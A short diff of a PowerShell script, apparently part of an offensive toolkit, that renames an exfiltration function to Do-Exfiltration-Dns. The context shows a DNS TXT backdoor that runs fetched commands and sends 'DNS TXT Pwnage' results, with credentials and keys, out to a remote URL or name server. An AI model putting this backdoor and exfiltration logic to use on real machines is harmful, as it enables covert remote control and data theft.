@@ -227,7 +227,7 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
             if ($exfil -eq $True)
             {
                 $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
-                Do-Exfiltration "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
+                Do-Exfiltration-Dns "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
             }
             if ($exec -eq 1)
             {
@@ -278,7 +278,7 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
             if ($exfil -eq $True)
             {
                 $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
-                Do-Exfiltration "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
+                Do-Exfiltration-Dns "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
             }
             if ($exec -eq 1)
             {
@@ -296,7 +296,7 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
 '@
 
 $exfiltration = @'
-function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,$password,$URL,$DomainName,$ExfilNS)
+function Do-Exfiltration-Dns($pastename,$pastevalue,$ExfilOption,$dev_key,$username,$password,$URL,$DomainName,$ExfilNS)
 {
     function post_http($url,$parameters) 
     { 
